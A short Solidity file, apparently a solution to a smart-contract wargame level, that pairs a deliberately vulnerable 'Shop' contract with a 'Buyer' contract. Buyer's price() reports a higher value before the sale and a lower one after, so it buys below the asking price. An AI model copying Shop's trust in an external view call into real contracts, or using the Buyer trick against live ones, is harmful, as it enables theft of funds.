// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer 
{
  Shop adr;
  constructor(address j)
  {
    adr =Shop(j);
  }
  function start() public 
  {
    adr.buy();
  }
  function price() external view returns (uint)
  {
    if(!adr.isSold())
    {
      return 100;
    }
    return 10;
  }

}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) 
    {
      isSold = true;
      price = _buyer.price();
    }
  }
}
